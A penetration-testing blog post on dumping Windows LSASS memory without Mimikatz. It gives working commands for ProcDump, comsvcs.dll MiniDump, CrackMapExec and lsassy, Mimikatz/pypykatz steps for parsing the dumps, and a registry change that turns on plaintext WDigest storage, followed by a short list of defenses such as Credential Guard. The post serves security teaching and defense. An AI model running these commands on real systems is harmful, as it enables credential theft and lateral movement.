---
title: "Attacks & Defenses: Dumping LSASS With No Mimikatz"
date: 2023-08-18
categories:
  - LSASS
  - Defense
  - Windows
author: "Talis Ozols"
---

# Attacks & Defenses: Dumping LSASS With No Mimikatz

## Mimikatz

Mimikatz is a big-name tool in penetration testing used to dump credentials from memory on Windows. As a penetration tester, this method is invaluable for lateral and vertical privilege escalation in Windows Active Directory environments.

Because of its popularity, the Mimikatz executable and PowerShell script are detected by most antivirus solutions. This post covers alternative methods to achieve the same goal without modifying Mimikatz, as well as defenses.

## Windows Authentication

Windows authentication mechanisms are complex, but several components are critical to understanding LSASS dumping.

### LSASS

The Local Security Authority Subsystem Service (LSASS) handles:

- User authentication
- Password changes
- Access token creation
- Security policy enforcement

As a result, LSASS stores hashed credentials and sometimes plaintext passwords in memory.

### WDigest

WDigest authentication stores plaintext passwords in memory.  
It is enabled by default on Windows versions prior to Windows 8 and Server 2012 R2.

## Necessary Conditions to Dump LSASS

Dumping LSASS requires the `SeDebugPrivilege`, typically granted to local administrators.

@@@bash
whoami /priv
@@@

On modern systems, PowerShell attempts are often blocked, so CMD or .NET tools are preferred.

## Processing LSASS Dump Files

### Mimikatz

@@@text
sekurlsa::minidump lsass.DMP
log lsass.txt
sekurlsa::logonPasswords
@@@

### Pypykatz

@@@bash
pypykatz lsa minidump lsass.DMP
@@@

## Attacks

### Task Manager

1. Open Task Manager
2. Go to **Details**
3. Right-click `lsass.exe`
4. Select **Create dump file**

Dump location:
C:\Users<user>\AppData\Local\Temp


### ProcDump

@@@bash
procdump.exe -accepteula -ma lsass.exe out.dmp
@@@

Dumping by PID:

@@@bash
tasklist | findstr lsass
procdump.exe -accepteula -ma <PID> out.dmp
@@@

### Comsvcs.dll

@@@bash
rundll32.exe comsvcs.dll, MiniDump <PID> C:\temp\out.dmp full
@@@

### CrackMapExec

@@@bash
crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa
@@@

### Lsassy

@@@bash
lsassy -d test.lab -u testadmin -p Password123 192.168.0.76
@@@

## Enabling WDigest

@@@bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
@@@

Disable again:

@@@bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 0
@@@

## Defenses

- Remove legacy systems
- Limit local admin access
- Disable WDigest
- Enable Credential Guard
- Monitor registry changes
- Reduce NTLM usage

### Credential Guard

Credential Guard isolates LSASS using virtualization-based security, preventing memory access.

## Conclusion

LSASS dumping remains a powerful attacker technique. Strong system hardening and modern defensive controls are required to prevent credential theft and lateral movement.
